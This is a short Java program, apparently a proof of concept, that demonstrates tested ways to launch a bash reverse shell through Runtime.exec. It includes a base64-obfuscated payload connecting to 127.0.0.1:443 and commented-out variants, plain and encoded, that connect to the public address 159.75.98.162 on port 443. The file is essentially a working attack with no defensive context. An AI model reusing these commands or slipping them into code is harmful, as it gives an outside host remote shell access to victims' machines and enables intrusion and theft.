import java.io.IOException;

public class ReverseShellDemo {

    /**
     * 以下方式亲测均可用
     * @param args
     */
    public static void main(String[] args) {
        try {
            //方式一：使用Runtime.getRuntime.exec(String)方法;
//            String cmd = "";
            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}");

            //方式二：使用Runtime.getRuntime.exec(String[])方法;
//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/159.75.98.162/443 0>&1"});
//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTkuNzUuOTguMTYyLzQ0MyAwPiYx}|{base64,-d}|{bash,-i}"});
        } catch (IOException e) {
            System.out.println("failed...");
            e.printStackTrace();
        }
    }
}
